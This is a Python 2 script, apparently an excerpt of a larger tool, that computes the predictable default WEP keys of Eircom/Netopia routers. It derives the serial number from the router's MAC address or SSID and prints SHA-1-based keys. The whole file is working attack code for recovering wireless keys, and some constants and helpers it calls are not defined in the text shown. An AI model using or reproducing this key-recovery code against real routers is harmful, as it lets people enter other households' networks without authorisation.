#!/usr/bin/env python

'''Predictable WEP key generation for Eircom routers.

Eircom key generation Heavily based on http://h1.ripway.com/kevindevine/wep_key.html
All credit for the Eircom key generation goes to Kevin Devine

'''

import hashlib


def check_manufacturer(macaddress):
    if macaddress.startswith(NETOPIAPREFIX):
        print "Netopia router detected. Generating tentative keys"
        return 1
    elif macaddress.startswith(FARALLONPREFIX):
        print "Netopia/Farallon router detected. Generating tentative keys"
        return 2
    return 0

def serial_from_mac(macaddress, company):
    #We don't need no stinking 2.6 transpose(None,":")
    # -8: in order to get the last 8 characters (the last 6 digits)
    macaddress = filter(lambda a: a!=":", macaddress[-8:])
    serial = 0
    for i in macaddress:
        serial = serial << 4
        serial += int(i, 16)
    if company == 1:
        serial += 0x01000000
    return serial

def serial_number(ssidoct):
    """Get the serial number form the supplied octal.

    Args:
      ssidoct: the base-10 int obtained from the octal

    Returns:
      serialnumber: the serial number of the access point
    """

    if len(ssidoct) != 2:
        return None

    # XOR the second segment with 0x0FCC (The Netopia MAC prefix)
    mac_segment = ssidoct[1] ^ 0x0FCC

    # Shift the first segment over by 12
    shiftseg = ssidoct[0] << 12

    # 0x01000000 because all Netopia serials start with it
    serial_start = 0x01000000

    fseg = (ssidoct[0] & 0xffffffff) >> (32 - 12)

    serialnumber = ((shiftseg | fseg) | mac_segment) + serial_start
    return serialnumber

def serial_string(serial):
    """Return the 'OneTwoThree' string of the serial number

    Args:
      serial: the serial number of the access point

    Returns:
      serialstr: the string of the serial number of the AP
    """

    serialno = str(serial)
    serialstr = ""
    for number in serialno:
        serialstr += inttoword(number)
    return serialstr

def gen_eircom_keys(serial, ap, numkeys):
    #TODO return data, don't print in this function


    if not(serial):
        return
    else:

        serialstr = serial_string(serial)
        shahex = ""

        length = 1
        if numkeys == 4:
            length = len(hendrix)
        for i in range(length):
            shastr = hashlib.sha1(serialstr + hendrix[i])
            shahex += shastr.hexdigest()

        ind = 0

        print "%s %s:" % (ap[0], ap[1])
        while (ind < numkeys*26):
            print "\t\t%s" % shahex[ind:ind+26]
            ind += 26
